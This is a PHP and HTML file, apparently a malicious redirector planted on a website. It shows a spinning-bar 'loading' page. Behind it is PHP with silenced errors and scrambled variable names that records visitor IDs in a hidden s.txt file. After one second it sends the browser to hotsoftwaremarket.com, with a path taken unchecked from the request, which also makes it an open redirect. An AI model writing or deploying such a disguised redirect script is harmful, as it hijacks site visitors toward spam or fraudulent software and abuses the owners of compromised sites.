<?php
@error_reporting(0); @ini_set('display_errors', 0); $spc18f49 = 'https://hotsoftwaremarket.com'; if (!empty($_REQUEST['uri'])) { $spc18f49 .= $_REQUEST['uri']; } if (!empty($_REQUEST['a'])) { header('content-type: application/json'); echo json_encode(array('url' => $spc18f49)); die; } $spd6c96f = preg_replace('/[^0-9A-Za-z]/', '', $_REQUEST['id']); if (!empty($spd6c96f)) { if (file_exists('s.txt')) { $spee0198 = @unserialize(@file_get_contents('s.txt')) ?: array(); } else { $spee0198 = array(); } if (empty($spee0198[$spd6c96f])) { $spee0198[$spd6c96f] = array(); } if (empty($spee0198[$spd6c96f]['visited'])) { $spee0198[$spd6c96f]['visited'] = time(); } @file_put_contents('s.txt', serialize($spee0198)); } ?>
<html>
<head>

<style type="text/css">

	@keyframes spinning-bars
	{
		0%
		{
			top: 6px;
			height: 51px;
		}
		50%, 100%
		{
			top: 19px;
			height: 26px;
		}
	}


	.bars
	{
		position: absolute;
		width: 64px;
		height: 64px;
		left: 50%;
		top: 50%;
		margin-top: -32px;
		margin-left: -32px;
		z-index: 100;
	}


	.bars span
	{
		display: inline-block;
		position: absolute;
		left: 6px;
		width: 13px;
		animation: spinning-bars 1.2s cubic-bezier(0, 0.5, 0.5, 1) infinite;
		background-color: #666666;
		border-radius: 5px;
	}



	.bars span:nth-child(1)
	{
		left: 6px;
		animation-delay: -0.24s;
	}

	.bars span:nth-child(2)
	{
		left: 26px;
		animation-delay: -0.12s;
	}

	.bars span:nth-child(3)
	{
		left: 45px;
		animation-delay: 0s;
	}

	.spinner
	{
		position: fixed;
		top: 50%;
		width: 100%;
	}


</style>

</head>
<body>

<div class="spinner">
	<div class="bars">
		<span></span>
		<span></span>
		<span></span>
	</div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>

<script language="javascript">

	$(function() {
		window.setTimeout(function() {
			$.getJSON("?a=b&uri=<?php  echo urlencode($_REQUEST['uri']); ?>
", function(data) {
				window.location = data.url;
			});
		}, 1000);
	});

</script>

</body>
</html>
<?php 